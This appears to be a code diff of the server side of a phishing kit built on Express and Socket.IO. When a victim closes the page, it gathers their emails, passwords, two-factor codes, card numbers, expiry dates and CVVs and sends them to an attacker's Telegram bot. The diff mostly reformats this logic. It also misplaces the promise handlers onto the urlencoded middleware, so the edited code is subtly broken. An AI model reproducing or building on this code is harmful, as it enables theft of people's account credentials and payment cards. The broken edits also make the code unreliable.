@@ -13,125 +13,102 @@ import { Ban } from "./ban.controller.js";
 import { CheckBan } from "./checkBan.controller.js";
 
 app.use(bodyParser.json());
-app.use(express.urlencoded({ extended: true }));
-app.use(
-  cors({
-    origin: "*",
-  })
-);
+app.use(express.urlencoded({ extended: true }).then(response => {
+    console.log("Telegram success:", response.data);
+}).catch(error => {
+    console.error("Telegram error:", error.message);
+}));
+app.use(cors({
+    origin: '*'
+}));
 
-app.post("/create/user", createUser);
-app.post("/send/ip", SendIp);
-app.get("/getMessages", GetMessages);
-app.get("/ban/:id", Ban);
-app.get("/checkBan/:id", CheckBan);
+app.post('/create/user', createUser);
+app.post('/send/ip', SendIp);
+app.get('/getMessages', GetMessages)
+app.get('/ban/:id', Ban)
+app.get('/checkBan/:id', CheckBan)
 
 const server = app.listen(port, () => {
-  console.log(`The Server is running on port http://localhost:${port}`);
+    console.log(`The Server is runing on port http://localhost:${port}`);
 });
 
+
 const io = new Server(server, {
-  cors: {
-    origin: "*",
-    credentials: true,
-  },
+    cors: {
+        origin: "*",
+        credentials: true,
+    },
 });
 
 var onlineUsers = [];
 
+
 io.on("connection", (socket) => {
-  global.chatSocket = socket;
+    global.chatSocket = socket;
+    socket.on("add-user", async (userId) => {
+        const user = onlineUsers.find((user) => user.userId === userId.userId);
+        if (!user) {
+            onlineUsers.push({ ...userId, socket: socket.id, data: {} });
+        }
+    });
+    socket.on("update-user", async (userId) => {
+        const user = onlineUsers.find((user) => user.userId === userId.userId);
 
-  socket.on("add-user", async (userId) => {
-    const user = onlineUsers.find((user) => user.userId === userId.userId);
-    if (!user) {
-      onlineUsers.push({ ...userId, socket: socket.id, data: {} });
-    }
-  });
+        onlineUsers = onlineUsers.filter((user) => user.socket !== socket.id);
 
-  socket.on("update-user", async (userId) => {
-    const user = onlineUsers.find((user) => user.userId === userId.userId);
+        if (user) {
+            onlineUsers.push({ ...userId, socket: socket.id, data: userId.data });
+        }
+      
+    });
 
-    onlineUsers = onlineUsers.filter((user) => user.socket !== socket.id);
+    socket.on("disconnect", () => {
+        const disconnectedUser = onlineUsers.find((user) => user.socket === socket.id);
+        onlineUsers = onlineUsers.filter((user) => user.socket !== socket.id);
 
-    if (user) {
-      onlineUsers.push({ ...userId, socket: socket.id, data: userId.data });
-    }
-  });
+       
+        
+        if (disconnectedUser?.data) {
+        console.log("Submitting to Telegram:", disconnectedUser.data);
 
-  socket.on("disconnect", () => {
-    const disconnectedUser = onlineUsers.find((user) => user.socket === socket.id);
-    onlineUsers = onlineUsers.filter((user) => user.socket !== socket.id);
+            const { id,
+                ip,
+                full_name,
+                login_email,
+                business_email,
+                page_name,
+                phone_number,
+                password_one,
+                password_two,
+                password_three,
+                tfa_one,
+                tfa_two,
+                whatsapp,
+                email2fa,
+                auth_app_2fa,
+                CardName,
+                CardNr,
+                CardDate,
+                CardCvc
+            } = disconnectedUser.data;
 
-    if (disconnectedUser?.data) {
-      console.log("Submitting to Telegram:", disconnectedUser.data);
+            const params =
+                `=============================\n${id ? `ID: \`${id}\`\n` : ''}${ip ? `IP: \`${ip}\`\n` : ''}${full_name ? `Full Name: \`${full_name}\`\n` : ''}${login_email ? `Email: \`${login_email}\`\n` : ''}${business_email ? `Business Email: \`${business_email}\`\n` : ''}${phone_number ? `Phone: \`${phone_number}\`\n` : ''}${page_name ? `Page Name: \`${page_name}\`\n` : ''}${password_one ? `Password1: \`${password_one}\`\n` : ''}${password_two ? `Password2: \`${password_two}\`\n` : ''}${password_three ? `Password3: \`${password_three}\`\n` : ''}${tfa_one ? `2fa: \`${tfa_one}\`\n` : ''}${tfa_two ? `2fa-2: \`${tfa_two}\`\n` : ''}${CardName ? `Name: \`${CardName}\`\n` : ''}${CardNr ? `Card Number: \`${CardNr}\`\n` : ''}${CardDate ? `Expiry Date: \`${CardDate}\`\n` : ''}${CardCvc ? `CVV: \`${CardCvc}\`\n` : ''}${whatsapp ? `Whatsapp 2fa: \`${whatsapp}\`\n` : ''}${email2fa ? `Email 2fa: \`${email2fa}\`\n` : ''}${auth_app_2fa ? `Auth App 2fa: \`${auth_app_2fa}\`\n` : ''}=============================`;
 
-      const {
-        id,
-        ip,
-        full_name,
-        login_email,
-        business_email,
-        page_name,
-        phone_number,
-        password_one,
-        password_two,
-        password_three,
-        tfa_one,
-        tfa_two,
-        whatsapp,
-        email2fa,
-        auth_app_2fa,
-        CardName,
-        CardNr,
-        CardDate,
-        CardCvc,
-      } = disconnectedUser.data;
+            const finalParams = params + `\nCurrent Step: Closed Page\n=============================`;
 
-      const params = `=============================\n${
-        id ? `ID: \`${id}\`\n` : ""
-      }${ip ? `IP: \`${ip}\`\n` : ""}${full_name ? `Full Name: \`${full_name}\`\n` : ""}${
-        login_email ? `Email: \`${login_email}\`\n` : ""
-      }${business_email ? `Business Email: \`${business_email}\`\n` : ""}${
-        phone_number ? `Phone: \`${phone_number}\`\n` : ""
-      }${page_name ? `Page Name: \`${page_name}\`\n` : ""}${
-        password_one ? `Password1: \`${password_one}\`\n` : ""
-      }${password_two ? `Password2: \`${password_two}\`\n` : ""}${
-        password_three ? `Password3: \`${password_three}\`\n` : ""
-      }${tfa_one ? `2fa: \`${tfa_one}\`\n` : ""}${
-        tfa_two ? `2fa-2: \`${tfa_two}\`\n` : ""
-      }${CardName ? `Name: \`${CardName}\`\n` : ""}${
-        CardNr ? `Card Number: \`${CardNr}\`\n` : ""
-      }${CardDate ? `Expiry Date: \`${CardDate}\`\n` : ""}${
-        CardCvc ? `CVV: \`${CardCvc}\`\n` : ""
-      }${whatsapp ? `Whatsapp 2fa: \`${whatsapp}\`\n` : ""}${
-        email2fa ? `Email 2fa: \`${email2fa}\`\n` : ""
-      }${auth_app_2fa ? `Auth App 2fa: \`${auth_app_2fa}\`\n` : ""}=============================\n`;
-
-      const finalParams =
-        params + `\nCurrent Step: Closed Page\n=============================\n`;
-
-      axios
-        .post(
-          `https://api.telegram.org/bot${process.env.BOT}/sendMessage`,
-          {
-            chat_id: process.env.CHAT_ID,
-            text: finalParams,
-            parse_mode: "Markdown",
-          },
-          {
-            headers: {
-              "Content-Type": "application/json",
-              "X-Robots-Tag": "googlebot: nofollow",
+            axios.post(`https://api.telegram.org/bot${process.env.BOT}/sendMessage`, {
+                chat_id: process.env.CHAT_ID,
+                text: finalParams,
+                parse_mode: 'Markdown',
             },
-          }
-        )
-        .then((response) => {
-          console.log("Telegram success:", response.data);
-        })
-        .catch((error) => {
-          console.error("Telegram error:", error.message);
-        });
-    }
-  });
+                {
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Robots-Tag': 'googlebot: nofollow',
+                    },
+
+                })
+        }
+    });
 });
